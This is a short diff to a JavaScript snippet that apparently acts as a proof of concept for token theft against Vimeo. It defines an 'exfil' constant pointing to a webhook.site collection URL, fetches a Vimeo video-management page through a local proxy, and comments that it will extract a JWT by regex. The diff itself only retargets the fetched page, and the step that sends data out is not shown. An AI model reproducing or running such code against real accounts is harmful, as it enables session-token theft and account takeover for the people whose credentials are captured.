@@ -11,7 +11,7 @@
     const exfil = "https://webhook.site/5749a8e8-dd44-4f2d-a5b6-229b51be49f1";
 
     // Step 1: Fetch Vimeo homepage via local proxy
-    fetch("http://localhost:3000/fetch?url=https://vimeo.com")
+    fetch("http://localhost:3000/fetch?url=https://vimeo.com/manage/videos/1108716779")
       .then(response => response.text())
       .then(html => {
         // Step 2: Extract JWT using regex
